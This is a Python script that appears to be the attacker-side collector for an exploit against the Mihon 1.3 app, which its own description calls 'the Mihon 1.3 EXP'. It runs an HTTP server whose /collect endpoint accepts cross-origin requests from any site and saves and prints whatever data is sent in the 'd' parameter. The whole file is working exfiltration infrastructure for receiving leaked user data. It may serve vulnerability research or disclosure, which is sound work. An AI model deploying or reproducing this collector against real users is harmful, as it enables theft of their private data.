from argparse import ArgumentParser
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse
import time


ROOT = Path(__file__).resolve().parent
RECEIVED_DIR = ROOT / "received"


class CollectHandler(BaseHTTPRequestHandler):
    server_version = "MihonNoticeExp/1.0"

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path != "/collect":
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"Mihon 1.3 collector is running\n")
            return

        query = parse_qs(parsed.query)
        data = query.get("d", [""])[0]
        RECEIVED_DIR.mkdir(exist_ok=True)
        output = RECEIVED_DIR / f"collected_{int(time.time() * 1000)}.txt"
        output.write_text(data, encoding="utf-8")

        self.send_response(HTTPStatus.OK)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok\n")
        print(f"received: {output}")
        print(data)

    def log_message(self, fmt, *args):
        print("%s - - %s" % (self.address_string(), fmt % args))


def parse_args():
    parser = ArgumentParser(description="Collect data leaked by the Mihon 1.3 EXP.")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8000)
    return parser.parse_args()


def main():
    args = parse_args()
    server = ThreadingHTTPServer((args.host, args.port), CollectHandler)
    print(f"collector listening on http://{args.host}:{args.port}/collect?d=<data>")
    server.serve_forever()


if __name__ == "__main__":
    main()
